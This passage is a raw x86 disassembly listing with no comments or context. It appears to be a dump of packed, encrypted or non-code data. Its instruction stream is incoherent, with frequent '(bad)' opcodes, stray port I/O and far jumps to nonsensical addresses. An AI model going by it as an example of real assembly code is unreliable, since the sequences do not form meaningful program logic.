  40abb4:	loop   0x40ab5e
  40abb6:	inc    eax
  40abb7:	dec    eax
  40abb8:	add    al,0x8a
  40abba:	sbb    eax,0xae517a85
  40abbf:	jbe    0x40abff
  40abc1:	mov    DWORD PTR [ecx+edi*1],edx
  40abc4:	pop    ds
  40abc5:	jns    0x40abb9
  40abc7:	xor    bh,BYTE PTR [edi-0x1d]
  40abca:	scas   eax,DWORD PTR es:[edi]
  40abcb:	mov    esp,0x418d8d9f
  40abd0:	gs iret 
  40abd2:	(bad)  
  40abd3:	into   
  40abd4:	mov    esp,0xda363d98
  40abd9:	push   esi
  40abda:	in     eax,dx
  40abdb:	jnp    0x40ab88
  40abdd:	aad    0x62
  40abdf:	cmp    al,0x3e
  40abe1:	in     al,0x77
  40abe3:	(bad)  
  40abe4:	mov    edi,0x4deae63f
  40abe9:	leave  
  40abea:	cdq    
  40abeb:	jae    0x40ab7c
  40abed:	rcr    bh,1
  40abef:	fsub   DWORD PTR [esi+0x25c4dfd3]
  40abf5:	sti    
  40abf6:	les    ebp,FWORD PTR [edx-0x55dc71e1]
  40abfc:	mov    edi,DWORD PTR [eax+0x5b]
  40abff:	push   esp
  40ac00:	aaa    
  40ac01:	mov    esi,0x88aca2cc
  40ac06:	jp     0x40ac7f
  40ac08:	fistp  QWORD PTR [esi-0x33]
  40ac0b:	mov    ds:0xa23ed568,al
  40ac10:	rep lods eax,DWORD PTR ds:[esi]
  40ac12:	loopne 0x40ac2a
  40ac14:	xor    eax,0x2330800
  40ac19:	xchg   DWORD PTR [ecx+0x436dfa80],ebx
  40ac1f:	mov    bh,0xd3
  40ac21:	data16 sahf 
  40ac23:	sub    eax,0x155b01a6
  40ac28:	jbe    0x40abf8
  40ac2a:	mov    dl,0x6c
  40ac2c:	push   ebp
  40ac2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac2e:	ja     0x40ac4e
  40ac30:	cwde   
  40ac31:	sub    al,0x55
  40ac33:	fdivr  DWORD PTR [ebp-0x6c]
  40ac36:	jecxz  0x40ac68
  40ac38:	adc    BYTE PTR ds:0xec1aea90,0x6c
  40ac3f:	mov    edx,DWORD PTR ss:[esi-0x3f]
  40ac43:	lds    eax,FWORD PTR [edi-0x59d319cc]
  40ac49:	leave  
  40ac4a:	pop    esi
  40ac4b:	sbb    eax,0xb41fbbfe
  40ac50:	dec    DWORD PTR [esi-0x19]
  40ac53:	pop    ebx
  40ac54:	add    eax,0xc79d4710
  40ac59:	pop    edx
  40ac5a:	aaa    
  40ac5b:	add    eax,ebp
  40ac5d:	jl     0x40ac9d
  40ac5f:	inc    edi
  40ac60:	inc    ebp
  40ac61:	mov    WORD PTR [ecx-0x5],es
  40ac64:	xor    al,0x60
  40ac66:	ins    DWORD PTR es:[edi],dx
  40ac67:	xor    al,0x97
  40ac69:	scas   eax,DWORD PTR es:[edi]
  40ac6a:	dec    esp
  40ac6b:	adc    BYTE PTR [edx-0x7c],dh
  40ac6e:	adc    dh,dl
  40ac70:	mov    cl,0xfb
  40ac72:	jmp    0xc00b:0x91ec8f58
  40ac79:	loop   0x40aca4
  40ac7b:	mov    ebp,0x41023970
  40ac80:	or     DWORD PTR [ebp+0x68080a8d],ebp
  40ac86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac87:	mov    cl,BYTE PTR [esi-0x25]
  40ac8a:	cdq    
  40ac8b:	add    DWORD PTR [ecx+0x61],ebx
  40ac8e:	mov    al,0x21
  40ac90:	mov    eax,ds:0xdaebd6a7
  40ac95:	cli    
  40ac96:	out    dx,eax
  40ac97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac98:	fdivr  DWORD PTR [esi+0x53]
  40ac9b:	and    DWORD PTR [edx-0x438e923a],esp
  40aca1:	push   esp
  40aca2:	inc    esi
  40aca3:	pop    ss
  40aca4:	and    eax,0x71f11a98
  40aca9:	xchg   esi,eax
  40acaa:	jp     0x40ac8a
  40acac:	mov    edi,0xcaaefc58
  40acb1:	add    eax,0xd3e08060
  40acb6:	add    BYTE PTR [ecx],cl
  40acb8:	(bad)  
  40acba:	shr    BYTE PTR [ecx-0x2035030d],0x39
  40acc1:	(bad)  
  40acc2:	and    ecx,DWORD PTR [edi]
  40acc4:	lahf   
  40acc5:	scas   al,BYTE PTR es:[edi]
  40acc6:	jmp    0x128f:0xbc29a8f3
  40accd:	and    DWORD PTR [esp+edi*4+0x5f],ebx
  40acd1:	imul   ecx,ebp,0xffffff97
  40acd4:	mov    edi,0xf9df2cf2
  40acd9:	fimul  WORD PTR [ebp+0x76]
  40acdc:	dec    esi
  40acdd:	jge    0x40ac6f
  40acdf:	(bad)  
  40ace0:	loope  0x40ad0b
  40ace2:	push   es
  40ace3:	sbb    esp,DWORD PTR [edi]
  40ace5:	dec    eax
  40ace6:	xchg   edx,eax
  40ace7:	into   
  40ace8:	mov    ds:0x5c7babae,al
  40aced:	fdiv   st(6),st
  40acef:	add    dl,0xc7
  40acf2:	iret   
  40acf3:	sbb    bl,BYTE PTR [ebx+0x35]
  40acf6:	push   ecx
  40acf7:	out    dx,eax
  40acf8:	cs pushf 
  40acfa:	xor    DWORD PTR [eax+0x653f23c0],esi
  40ad00:	pushf  
  40ad01:	aas    
  40ad02:	into   
  40ad03:	js     0x40ad15
  40ad05:	(bad)  
  40ad06:	outs   dx,BYTE PTR ds:[esi]
  40ad07:	mov    ss,WORD PTR [ebp+0x3a308d97]
  40ad0d:	sar    bh,1
  40ad0f:	fcom   DWORD PTR [edi]
  40ad11:	and    BYTE PTR [esi+eax*8+0x1cb4bd58],ch
  40ad18:	pop    eax
  40ad19:	sub    al,0xcd
  40ad1b:	test   eax,0xba3aa2c0
  40ad20:	imul   BYTE PTR [ebx+0x2babfabf]
  40ad26:	out    0x8,eax
  40ad28:	mov    edi,0x61c725f
  40ad2d:	push   eax
  40ad2e:	fnstsw WORD PTR [ebp+0x59]
  40ad31:	xchg   esi,eax
  40ad32:	pusha  
  40ad33:	sub    eax,0xd3e450a2
  40ad38:	cmp    BYTE PTR [edi],0xfa
  40ad3b:	jg     0x40ad3b
  40ad3d:	or     eax,0x46b125b2
  40ad42:	push   esp
  40ad43:	xchg   ebp,eax
  40ad44:	mov    bl,0x6a
  40ad46:	je     0x40ad1f
  40ad48:	fld    QWORD PTR [edx+0x76]
  40ad4b:	(bad)  
  40ad4c:	xchg   ecx,eax
  40ad4d:	jnp    0x40ad40
  40ad4f:	add    esp,eax
  40ad51:	fucomi st,st(6)
  40ad53:	je     0x40ad73
  40ad55:	(bad)  
  40ad56:	jl     0x40ada0
  40ad58:	sub    DWORD PTR [ecx],ebp
  40ad5a:	mov    ch,0x26
  40ad5c:	mov    DWORD PTR [esi-0x5a],esp
  40ad5f:	or     ebx,esi
  40ad61:	add    bl,BYTE PTR [esp+ebx*1]
  40ad64:	in     al,dx
  40ad65:	jae    0x40ad4a
  40ad67:	xchg   esi,eax
  40ad68:	rcr    edx,0xd4
  40ad6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad6c:	add    BYTE PTR [edi],ch
  40ad6e:	inc    edx
  40ad6f:	sub    BYTE PTR [esi+0x5d],0x82
  40ad73:	rol    BYTE PTR [ebx],1
  40ad75:	push   ebx
  40ad76:	cmp    DWORD PTR [ebx],eax
  40ad78:	sbb    ecx,0x69
  40ad7b:	add    DWORD PTR [edi+esi*1+0x2078c91],eax
  40ad82:	fisttp WORD PTR [edx]
  40ad84:	xchg   ebp,eax
  40ad85:	adc    dh,BYTE PTR [ebx+edi*4+0xe]
  40ad89:	add    al,0xe6
  40ad8b:	cdq    
  40ad8c:	es (bad) 
  40ad8e:	jp     0x40ad95
  40ad90:	daa    
  40ad91:	xor    DWORD PTR [ebp+0x6f],ebx
  40ad94:	int3   
  40ad95:	push   ds
  40ad96:	dec    esp
  40ad97:	lods   al,BYTE PTR ds:[esi]
  40ad98:	les    ecx,FWORD PTR [ebp+0x53]
  40ad9b:	and    BYTE PTR [edx-0x53],ch
  40ad9e:	add    BYTE PTR ss:[eax+0x73],cl
  40ada2:	jl     0x40ade5
  40ada4:	pusha  
  40ada5:	sub    eax,0x3d09871
  40adaa:	push   eax
  40adab:	or     eax,0x81519a7c
  40adb0:	sub    ch,al
  40adb2:	sbb    bl,cl
  40adb4:	inc    esi
  40adb5:	idiv   DWORD PTR [edx]
  40adb7:	mov    edi,0x3e52b7f2
  40adbc:	stc    
  40adbd:	pop    edi
  40adbe:	cmp    eax,0xa8ea5286
  40adc3:	test   BYTE PTR [esi-0xa0e75c5],dl
  40adc9:	lods   al,BYTE PTR ds:[esi]
  40adca:	xchg   esp,eax
  40adcb:	loop   0x40ad52
  40adcd:	outs   dx,DWORD PTR ds:[esi]
  40adce:	mov    edi,0xf8ff97c4
  40add3:	and    eax,0x61ef9bfa
  40add8:	arpl   WORD PTR [edx+ecx*4-0x22],si
  40addc:	pusha  
  40addd:	pop    es
  40adde:	xchg   ebp,eax
  40addf:	not    al
  40ade1:	mov    BYTE PTR [esi+0x2a],0xbd
  40ade5:	sar    BYTE PTR [eax-0x4f],1
  40ade8:	test   al,0xfa
  40adea:	or     al,BYTE PTR [ebp+eax*2+0x5e2d0265]
  40adf1:	lea    edi,[ebx]
  40adf3:	push   0xffffffc1
  40adf5:	pop    esp
  40adf6:	stos   DWORD PTR es:[edi],eax
  40adf7:	(bad)  
  40adf8:	cmp    eax,0x76a21e6a
  40adfd:	out    dx,al
  40adfe:	inc    ebp
  40adff:	fistp  DWORD PTR [eax+0x20]
  40ae02:	lds    esi,FWORD PTR [edx+0x5b]
  40ae05:	stos   BYTE PTR es:[edi],al
  40ae06:	xchg   esp,eax
  40ae07:	aas    
  40ae08:	mov    ds:0xba0965ff,al
  40ae0d:	mov    ah,0x6c
  40ae0f:	hlt    
  40ae10:	sub    al,0x52
  40ae12:	les    eax,FWORD PTR [eax-0x1d]
  40ae15:	out    dx,eax
  40ae16:	aad    0xb7
  40ae18:	scas   eax,DWORD PTR es:[edi]
  40ae19:	rcl    BYTE PTR [eax+0x2af1e3c6],0x47
  40ae20:	jmp    0xc1f02a1e
  40ae25:	mov    bh,0x27
  40ae27:	(bad)  
  40ae28:	int    0x4
  40ae2a:	je     0x40ae95
  40ae2c:	pushf  
  40ae2d:	inc    edx
  40ae2e:	mov    edx,0x9fdecdf5
  40ae33:	mov    cl,0xf3
  40ae35:	mov    eax,ds:0x75e4d90e
  40ae3a:	out    0x2f,al
  40ae3c:	sbb    ecx,esp
  40ae3e:	in     eax,dx
  40ae3f:	push   cs
  40ae40:	sbb    BYTE PTR [ecx+0x5285056c],al
  40ae46:	mov    ah,0xdb
  40ae48:	sub    eax,0x4cc70f0e
  40ae4d:	es xchg ebx,eax
  40ae4f:	call   0x773d:0x92f7e2d
  40ae56:	push   ebx
  40ae57:	call   0x9381313f
  40ae5c:	xchg   esi,eax
  40ae5d:	ret    0x6d02
  40ae60:	lea    esi,[ecx]
  40ae62:	in     al,0x59
  40ae64:	out    0x22,al
  40ae66:	add    ch,bh
  40ae68:	jle    0x40ae6f
  40ae6a:	repz (bad) 
  40ae6c:	das    
  40ae6d:	xor    dh,BYTE PTR [ecx-0x17]
  40ae70:	repnz add eax,0xc402de6e
  40ae76:	bound  ecx,QWORD PTR [ebx+eax*4-0x6c]
  40ae7a:	mov    eax,ds:0x29cad8b9
  40ae7f:	push   ebp
  40ae80:	cmp    DWORD PTR [ecx],edi
  40ae82:	ret    
  40ae83:	sbb    DWORD PTR [edx-0x40111360],0x6d
  40ae8a:	int3   
  40ae8b:	dec    ebp
  40ae8c:	and    eax,0x97eda584
  40ae91:	adc    eax,0x4a0acd9f
  40ae96:	ins    DWORD PTR es:[edi],dx
  40ae97:	rcl    BYTE PTR [ebp-0x4dd630ed],1
  40ae9d:	xchg   esp,eax
  40ae9e:	call   0x1321:0x6548144
  40aea5:	(bad)  
  40aea7:	add    al,0xd5
  40aea9:	ret    0x3547
  40aeac:	rol    BYTE PTR ss:[esp+ecx*4],1
  40aeb0:	mov    BYTE PTR [edx+0xac10c87],ch
  40aeb6:	sub    esp,DWORD PTR [edx+0x2690801c]
  40aebc:	sbb    al,0xa8
  40aebe:	jg     0x40af25
  40aec0:	jbe    0x40aef6
  40aec2:	xor    cl,BYTE PTR [edx]
  40aec4:	sub    edx,DWORD PTR [eax]
  40aec6:	jo     0x40ae69
  40aec8:	shl    DWORD PTR [esi+0x3a],0xe7
  40aecc:	scas   eax,DWORD PTR es:[edi]
  40aecd:	std    
  40aece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aecf:	cmp    edi,edi
  40aed1:	cmc    
  40aed2:	das    
  40aed3:	jle    0x40ae65
  40aed5:	jbe    0x40ae92
  40aed7:	jne    0x40aea0
  40aed9:	sahf   
  40aeda:	outs   dx,BYTE PTR ds:[esi]
  40aedb:	xchg   ebp,eax
  40aedc:	add    al,0x1a
  40aede:	sub    al,0xa5
  40aee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aee1:	shr    ecx,cl
  40aee3:	jo     0x40aee2
  40aee5:	cli    
  40aee6:	sub    eax,0x5ff3f77e
  40aeeb:	daa    
  40aeec:	aaa    
  40aeed:	fucomi st,st(4)
  40aeef:	ins    BYTE PTR es:[edi],dx
  40aef0:	sahf   
  40aef1:	mov    ds:0xdda1dfdb,eax
  40aef6:	sbb    DWORD PTR [edx-0x4],esp
  40aef9:	mov    al,ds:0x5f7d1aa9
  40aefe:	mov    eax,0x72bd179c
  40af03:	int3   
  40af04:	ss push ss
  40af06:	push   edi
  40af07:	and    DWORD PTR [eax+0x528188a5],eax
  40af0d:	les    ecx,FWORD PTR [esi-0xa6ae4c1]
  40af13:	inc    eax
  40af14:	and    BYTE PTR [edx-0x17],al
  40af17:	sbb    BYTE PTR [edx+eax*1],ah
  40af1a:	int    0x8b
  40af1c:	cdq    
  40af1d:	es push 0xcfe39c23
  40af23:	jg     0x40aeaf
  40af25:	adc    cl,BYTE PTR [edx-0x6815ccae]
  40af2b:	or     dl,bl
  40af2d:	mov    ch,0xe7
  40af2f:	lea    edi,[edi+0x15c021c7]
  40af35:	sbb    eax,0x21abbd5
  40af3a:	test   bl,ah
  40af3c:	add    eax,eax
  40af3e:	sub    eax,esi
  40af40:	or     DWORD PTR [esi],edi
  40af42:	dec    ecx
  40af43:	mov    ebp,ebx
  40af45:	pop    ds
  40af46:	mov    edi,0x3397fb48
  40af4b:	jle    0x40af3e
  40af4d:	addr16 aas 
  40af4f:	rol    DWORD PTR [ebx-0x8736c7d],0x27
  40af56:	mov    esp,0x7c1ba5fe
  40af5b:	sti    
  40af5c:	pop    edi
  40af5d:	in     eax,dx
  40af5e:	xor    DWORD PTR [ebp+0x524242e0],edi
  40af64:	mov    edx,0xbad6afd8
  40af69:	repnz add DWORD PTR [edx+ebp*2-0x43cc08e4],ebp
  40af71:	ja     0x40afaa
  40af73:	cmp    ebx,DWORD PTR [edi]
  40af75:	ja     0x40af12
  40af77:	fild   QWORD PTR [ebp+0x200000]
  40af7d:	dec    ecx
  40af7e:	inc    esp
  40af7f:	inc    ecx
  40af80:	push   esp
  40af81:	push   esi
  40af82:	fwait
  40af83:	add    edx,DWORD PTR [edx-0x46]
  40af86:	pop    ecx
  40af87:	outs   dx,BYTE PTR ds:[esi]
  40af88:	stos   BYTE PTR es:[edi],al
  40af89:	xchg   ebp,eax
  40af8a:	pop    ecx
  40af8b:	and    esp,DWORD PTR [edi-0x23d965a2]
  40af91:	mov    eax,0xb1839b71
  40af96:	hlt    
  40af97:	mov    ecx,0xc5f95e36
  40af9c:	loop   0x40af78
  40af9e:	jno    0x40afa8
  40afa0:	mov    al,0xb2
  40afa2:	int3   
  40afa3:	in     eax,dx
  40afa4:	bound  edi,QWORD PTR [edi]
  40afa6:	mov    esi,0x4066c541
  40afab:	call   0x74d3447f
  40afb0:	cmp    cl,BYTE PTR [edx-0x46af5a4c]
  40afb6:	inc    esi
  40afb7:	jnp    0x40af86
  40afb9:	xchg   esi,eax
  40afba:	adc    cl,BYTE PTR [esi-0x63]
  40afbd:	enter  0xb538,0x93
  40afc1:	jno    0x40afb9
  40afc3:	mov    ah,0xe5
  40afc5:	shl    DWORD PTR [ebx+0x7d],0xba
  40afc9:	fld    QWORD PTR [ecx+esi*8+0x4b85ce61]
  40afd0:	xchg   DWORD PTR [edi+ebp*8+0x15],edi
  40afd4:	retf   
  40afd5:	cmc    
  40afd6:	fst    QWORD PTR [ebx]
  40afd8:	push   0xbd95d693
  40afdd:	xchg   edx,eax
  40afde:	js     0x40af7c
  40afe0:	and    BYTE PTR [eax+0x39],0x2a
  40afe4:	ror    BYTE PTR [esp+esi*1-0xa6a3dd4],1
  40afeb:	jmp    0x77206b2
  40aff0:	pop    es
  40aff1:	add    bl,BYTE PTR [edi]
  40aff3:	jp     0x40aff1
  40aff5:	push   es
  40aff6:	mov    edi,0xc63ddff1
  40affb:	mov    ecx,0x50b83bb3
  40b000:	loopne 0x40afec
  40b002:	icebp  
  40b003:	push   ds
  40b004:	icebp  
  40b005:	cmp    ebp,DWORD PTR [ecx+0x6e]
  40b008:	mov    bh,0xd6
  40b00a:	in     eax,0x59
  40b00c:	in     al,0x79
  40b00e:	into   
  40b00f:	pop    ss
  40b010:	push   eax
  40b012:	jmp    0x40afd0
  40b014:	jne    0x40afcf
  40b016:	in     al,0xf4
  40b018:	fld    DWORD PTR [edi-0x18]
  40b01b:	je     0x40afd4
  40b01d:	call   0x6498f696
  40b022:	ins    DWORD PTR es:[edi],dx
  40b023:	mov    edx,0x38588475
  40b028:	hlt    
  40b029:	in     al,dx
  40b02a:	adc    BYTE PTR [ecx+0x6b30d108],0x44
  40b031:	add    eax,DWORD PTR [esp+edi*1]
  40b034:	js     0x40afbf
  40b036:	lds    ecx,FWORD PTR [ebx-0x4d13557]
  40b03c:	or     ebp,DWORD PTR [edx+eax*8]
  40b03f:	out    dx,eax
  40b040:	pop    edi
  40b041:	dec    esp
  40b042:	sbb    eax,0xb72a226
  40b047:	xchg   esi,eax
  40b048:	pop    ss
  40b049:	jl     0x40b04b
  40b04b:	aad    0x78
  40b04d:	add    ch,ch
  40b04f:	xchg   BYTE PTR [eax+0x1b],cl
  40b052:	pop    ebp
  40b053:	mov    ds:0xdba94664,al
  40b058:	xor    eax,0x96d9bf7b
  40b05d:	(bad)
  40b061:	mov    ebx,0x6384021c
  40b066:	data16 add al,BYTE PTR [edx-0x125261ad]
  40b06d:	ins    DWORD PTR es:[edi],dx
  40b06e:	push   ds
  40b06f:	mov    esi,0xff9718f9
  40b074:	hlt    
  40b075:	adc    eax,0xa79faebe
  40b07a:	test   DWORD PTR [ecx-0x49d8cf1],0xdffd3f24
  40b084:	hlt    
  40b085:	imul   ebp,DWORD PTR [edi+0x5c],0xf8ff4be2
  40b08c:	xor    dl,bl
  40b08e:	leave  
  40b08f:	add    al,0xa5
  40b091:	jmp    0x4ab0:0x1551c026
  40b098:	mov    ds,WORD PTR [ebx]
  40b09a:	cli    
  40b09b:	imul   ebp,esi,0xfffffff7
  40b09e:	idiv   DWORD PTR [edi+ecx*8-0x29]
  40b0a2:	push   edx
  40b0a3:	dec    edx
  40b0a4:	xchg   ecx,eax
  40b0a5:	sti    
  40b0a6:	mov    DWORD PTR [eax+0x63],eax
  40b0a9:	inc    edx
  40b0aa:	sbb    eax,0xaf57821c
  40b0af:	fisub  WORD PTR [edx+0x3e]
  40b0b2:	in     eax,dx
  40b0b3:	inc    eax
  40b0b4:	push   0xffffff91
  40b0b6:	sbb    BYTE PTR [edx],0x0
  40b0b9:	xor    al,0xf3
  40b0bb:	aaa    
  40b0bc:	stos   BYTE PTR es:[edi],al
  40b0bd:	outs   dx,BYTE PTR ss:[esi]
  40b0bf:	pop    ss
  40b0c0:	and    DWORD PTR [eax-0x7c],eax
  40b0c3:	ret    0x51fa
  40b0c6:	and    eax,0x45431ae
  40b0cb:	adc    al,0x29
  40b0cd:	mov    eax,ds:0xb4e84add
  40b0d2:	adc    esp,DWORD PTR [esi-0x2d]
  40b0d5:	sbb    BYTE PTR [ebx+ecx*8],0xc6
  40b0d9:	pusha  
  40b0da:	into   
  40b0db:	pop    es
  40b0dc:	sahf   
  40b0dd:	enter  0x2bf8,0x9f
  40b0e1:	cmp    al,cl
  40b0e3:	inc    edi
  40b0e4:	jg     0x40b0d0
  40b0e6:	jge    0x40b084
  40b0e8:	cmp    DWORD PTR [ebx-0x542850b3],esi
  40b0ee:	sahf   
  40b0ef:	sub    eax,0xf85e73cf
  40b0f4:	idiv   BYTE PTR [ecx-0x2]
  40b0f7:	out    dx,eax
  40b0f8:	jg     0x40b0f1
  40b0fa:	jge    0x40b0fa
  40b0fc:	in     al,0xb9
  40b0fe:	cs sar esp,cl
  40b101:	add    al,0x96
  40b103:	push   es
  40b104:	or     ah,al
  40b106:	push   cs
  40b107:	ret    
  40b108:	mov    dl,BYTE PTR [edx]
  40b10a:	inc    edi
  40b10b:	mov    ebp,0xb35fd859
  40b110:	and    ah,dl
  40b112:	sahf   
  40b113:	xor    BYTE PTR [edx],dh
  40b115:	adc    ebp,DWORD PTR [edx]
  40b117:	jg     0x40b0d9
  40b119:	ret    0xb829
  40b11c:	xor    edi,DWORD PTR [esi+ecx*8+0x6edff0ff]
  40b123:	lock in al,0x13
  40b126:	sub    esp,DWORD PTR [bx+si-0x4191]
  40b12b:	(bad)  
  40b12c:	out    0xff,al
  40b12e:	or     BYTE PTR es:[ebp+eiz*2-0x1edb6d44],al
  40b136:	imul   ebx,DWORD PTR [edi-0x1],0x33
  40b13a:	(bad)  
  40b13b:	in     al,0xeb
  40b13d:	scas   eax,DWORD PTR es:[edi]
  40b13e:	xor    ebx,edx
  40b140:	jp     0x40b181
  40b142:	std    
  40b143:	lea    edx,[ebx]
  40b145:	hlt    
  40b146:	jp     0x40b1a3
  40b148:	dec    eax
  40b149:	fptan  
  40b14b:	cmc    
  40b14c:	sbb    eax,DWORD PTR [ebx-0x1d394065]
  40b152:	addr16 cmc 
  40b154:	pop    esp
  40b155:	mov    ebx,DWORD PTR [esi]
  40b157:	jge    0x40b17a
  40b159:	cmc    
  40b15a:	mov    ds:0x14223cee,al
  40b15f:	or     al,0xe0
  40b161:	dec    eax
  40b162:	add    BYTE PTR [ecx-0x7bd05e46],al
  40b168:	lea    esp,[edx]
  40b16a:	mov    al,ds:0x8f08c075
  40b16f:	loope  0x40b1b7
  40b171:	call   FWORD PTR [ecx-0x41]
  40b174:	sbb    BYTE PTR [eax+0x462dfff0],ch
  40b17a:	imul   edx,edx,0x46
  40b17d:	push   cs
  40b17e:	inc    eax
  40b17f:	nop
  40b180:	push   eax
  40b181:	pop    es
  40b182:	dec    edx
  40b183:	sub    esi,esi
  40b185:	div    edi
  40b187:	push   edi
  40b188:	test   DWORD PTR [eax],eax
  40b18a:	xor    eax,0xbbd0206e
  40b18f:	sub    al,bh
  40b191:	sahf   
  40b192:	adc    al,0x54
  40b194:	imul   ecx,ebp,0xffffffe9
  40b197:	mov    bl,0xa7
  40b199:	clc    
  40b19a:	in     al,dx
  40b19b:	pop    es
  40b19c:	jg     0x40b127
  40b19e:	aaa    
  40b19f:	iret   
  40b1a0:	mov    edi,0x5e67a5ce
  40b1a5:	jecxz  0x40b202
  40b1a7:	iret   
  40b1a8:	mov    esp,0x31b1e0c4
  40b1ad:	daa    
  40b1ae:	jg     0x40b152
  40b1b0:	dec    edi
  40b1b1:	push   DWORD PTR [ecx+0x38]
  40b1b4:	stc    
  40b1b5:	dec    ecx
  40b1b6:	mov    DWORD PTR [esi+0xd2c6883],ebx
  40b1bc:	jnp    0x40b19a
  40b1be:	inc    ecx
  40b1bf:	cmp    al,bh
  40b1c1:	fst    st(6)
  40b1c3:	fmul   QWORD PTR [edi]
  40b1c5:	jne    0x40b1d7
  40b1c7:	cmp    BYTE PTR [edx-0xc207bfb],cl
  40b1cd:	fxch   st(4)
  40b1cf:	das    
  40b1d0:	adc    DWORD PTR [esi-0x63],ebx
  40b1d3:	add    al,0x21
  40b1d5:	and    eax,0x3cde6ac6
  40b1da:	jg     0x40b1f7
  40b1dc:	inc    esp
  40b1dd:	(bad)  
  40b1df:	icebp  
  40b1e0:	stc    
  40b1e1:	inc    DWORD PTR [edx]
  40b1e3:	mov    eax,ds:0x1a061ba4
  40b1e8:	xchg   esi,eax
  40b1e9:	xor    ecx,DWORD PTR [ebx]
  40b1eb:	jg     0x40b1f1
  40b1ed:	xchg   ebp,eax
  40b1ee:	push   ebx
  40b1ef:	rcl    BYTE PTR [edx],1
  40b1f1:	sbb    cl,BYTE PTR [edx-0x7bb3e361]
  40b1f7:	mov    al,0xa1
  40b1f9:	add    al,0xab
  40b1fb:	mov    cl,0x3e
  40b1fd:	mov    esi,ss
  40b1ff:	outs   dx,BYTE PTR ds:[esi]
  40b200:	dec    ecx
  40b201:	cli    
  40b202:	jge    0x40b1c9
  40b204:	je     0x40b1b0
  40b206:	sbb    BYTE PTR [esi+0x4c],ch
  40b209:	stc    
  40b20a:	stos   DWORD PTR es:[edi],eax
  40b20b:	jg     0x40b266
  40b20d:	icebp  
  40b20e:	ja     0x40b20e
  40b210:	out    0xd3,al
  40b212:	cmp    al,0xfe
  40b214:	sahf   
  40b215:	inc    edi
  40b216:	stos   DWORD PTR es:[edi],eax
  40b217:	in     eax,0xad
  40b219:	jecxz  0x40b1d3
  40b21b:	mov    edx,0x1f079294
  40b220:	jl     0x40b1b2
  40b222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b223:	aas    
  40b224:	cli    
  40b225:	pop    esi
  40b226:	(bad)  
  40b227:	(bad)  
  40b229:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b22b:	cld    
  40b22c:	pop    edi
  40b22d:	push   esi
  40b22f:	dec    ebp
  40b230:	fidivr WORD PTR [edx-0x5939ef0a]
  40b236:	sub    al,0xa5
  40b238:	out    dx,al
  40b239:	scas   al,BYTE PTR es:[edi]
  40b23a:	or     al,0xfd
  40b23c:	stc    
  40b23d:	push   esi
  40b23e:	mov    ebp,0xa231d972
  40b243:	std    
  40b244:	push   ds
  40b245:	push   esp
  40b246:	ret    0xf3e
  40b249:	adc    bl,BYTE PTR [ebp+0x7e67ce56]
  40b24f:	es out 0xb3,eax
  40b252:	lahf   
  40b253:	dec    BYTE PTR [ecx-0x46]
  40b256:	fnsave [esi+0x6d]
  40b259:	inc    edx
  40b25a:	retf   
  40b25b:	push   ebp
  40b25c:	mov    ebp,0xb1cf5c7c
  40b261:	dec    eax
  40b262:	sub    ecx,ebp
  40b264:	jbe    0x40b221
  40b266:	pop    esp
  40b267:	mov    esi,0xffcf9572
  40b26c:	(bad)  
  40b26d:	aaa    
  40b26e:	mov    cl,0xea
  40b270:	xor    al,0xfd
  40b272:	loope  0x40b2cd
  40b274:	pop    edx
  40b275:	popf   
  40b276:	dec    ebp
  40b277:	fs shl cl,cl
  40b27a:	jmp    0x40b2b7
  40b27c:	xor    al,0x7a
  40b27e:	hlt    
  40b27f:	enter  0xb10d,0xe8
  40b283:	mov    eax,0xcfbc9445
  40b288:	inc    edx
  40b289:	shr    DWORD PTR [ebx+0x503675fd],0xa9
  40b290:	mov    dl,0x8
  40b292:	adc    al,0xbf
  40b294:	jmp    0x44f3ab4
  40b299:	outs   dx,DWORD PTR ds:[esi]
  40b29a:	les    esp,FWORD PTR ds:[esi-0x39]
  40b29e:	add    al,al
  40b2a0:	lods   eax,DWORD PTR ds:[esi]
  40b2a1:	jne    0x40b24c
  40b2a3:	fsubr  QWORD PTR [esi+0x65]
  40b2a6:	fs mov bh,0x66
  40b2a9:	bound  ebx,QWORD PTR [ecx+0x4a]
  40b2ac:	mov    al,0x13
  40b2ae:	inc    esi
  40b2af:	ret    
  40b2b0:	xor    BYTE PTR [esi-0x7f4e575c],cl
  40b2b6:	push   eax
  40b2b7:	aaa    
  40b2b8:	dec    edx
  40b2b9:	sub    DWORD PTR [edx-0xf759a94],esi
  40b2bf:	xchg   esp,eax
  40b2c0:	pop    ds
  40b2c1:	and    eax,0x1382013
  40b2c6:	sub    DWORD PTR ds:0xf119da3d,0x53
  40b2cd:	cmp    ecx,DWORD PTR [edi-0xd]
  40b2d0:	mov    eax,ds:0x7a5ca3e2
  40b2d5:	jmp    0x40b309
  40b2d7:	scas   eax,DWORD PTR es:[edi]
  40b2d8:	mov    ebp,0xbfd732f8
  40b2dd:	jp     0x40b268
  40b2df:	pop    ebx
  40b2e0:	rep stos DWORD PTR es:[edi],eax
  40b2e2:	int3   
  40b2e3:	scas   al,BYTE PTR es:[edi]
  40b2e4:	es and al,0x3f
  40b2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2e8:	nop
  40b2e9:	push   edx
  40b2ea:	xchg   ecx,eax
  40b2eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2ec:	sub    eax,0x46551084
  40b2f1:	pop    eax
  40b2f2:	nop
  40b2f3:	jecxz  0x40b2ed
  40b2f5:	add    dh,ch
  40b2f7:	gs pop ebx
  40b2f9:	mov    eax,0x503d55b7
  40b2fe:	repz cmp dh,cl
  40b301:	jae    0x40b2c3
  40b303:	ret    0x3027
  40b306:	pop    edi
  40b307:	cmp    DWORD PTR [ebx],edx
  40b309:	mov    al,0x4b
  40b30b:	jne    0x40b2ca
  40b30d:	jo     0x40b300
  40b30f:	add    BYTE PTR [eax],bl
  40b311:	cli    
  40b312:	ins    DWORD PTR es:[edi],dx
  40b313:	add    DWORD PTR cs:[eax-0x8],ecx
  40b317:	imul   ebx,DWORD PTR [eax+0x21d948],0x42
  40b31e:	int3   
  40b31f:	js     0x40b341
